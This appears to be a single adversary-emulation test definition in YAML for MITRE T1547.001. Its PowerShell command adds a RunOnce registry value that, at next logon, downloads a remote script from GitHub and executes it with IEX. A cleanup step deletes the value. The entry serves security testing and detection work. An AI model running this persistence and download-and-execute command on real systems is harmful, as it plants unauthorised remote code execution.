- id: 2de36ef4-2137-5989-83be-ce11c935dce0
  name: Soumaia ART Tests - PowerShell Registry RunOnce
  description: 'RunOnce Key Persistence via PowerShell

    Upon successful execution, a new entry will be added to the runonce item in the registry. (requires elevation)'
  tactic: privilege-escalation
  technique:
    attack_id: T1547.001
    name: 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
  platforms:
    windows:
      psh:
        command: |-
          $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
          set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'
        cleanup: |-
          Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore
